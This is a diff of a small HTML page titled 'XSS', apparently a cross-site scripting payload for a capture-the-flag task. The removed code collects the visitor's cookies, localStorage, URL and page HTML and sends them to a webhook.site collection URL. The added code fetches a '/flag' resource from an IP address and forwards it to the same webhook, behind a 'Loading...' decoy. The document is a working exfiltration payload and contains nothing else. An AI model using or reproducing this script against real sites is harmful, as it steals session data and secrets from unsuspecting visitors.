@@ -2,26 +2,20 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>XSS Test Page</title>
+    <title>XSS</title>
 </head>
 <body>
-
 <h2>Loading...</h2>
 
 <script>
 (function() {
-    let out = {
-        cookie: document.cookie,
-        ls: JSON.stringify(localStorage),
-        url: location.href,
-        html: document.documentElement.innerHTML
-    };
-    fetch("https://webhook.site/8e33713a-acea-4b39-bfa9-cf8ffd7d7a1d?d="
-          + encodeURIComponent(JSON.stringify(out)));
+    fetch("http://95.182.100.126:8080/flag")
+        .then(r => r.text())
+        .then(flag => {
+            fetch("https://webhook.site/8e33713a-acea-4b39-bfa9-cf8ffd7d7a1d?flag=" + encodeURIComponent(flag));
+        });
 })();
 </script>
-
-
 
 </body>
 </html>
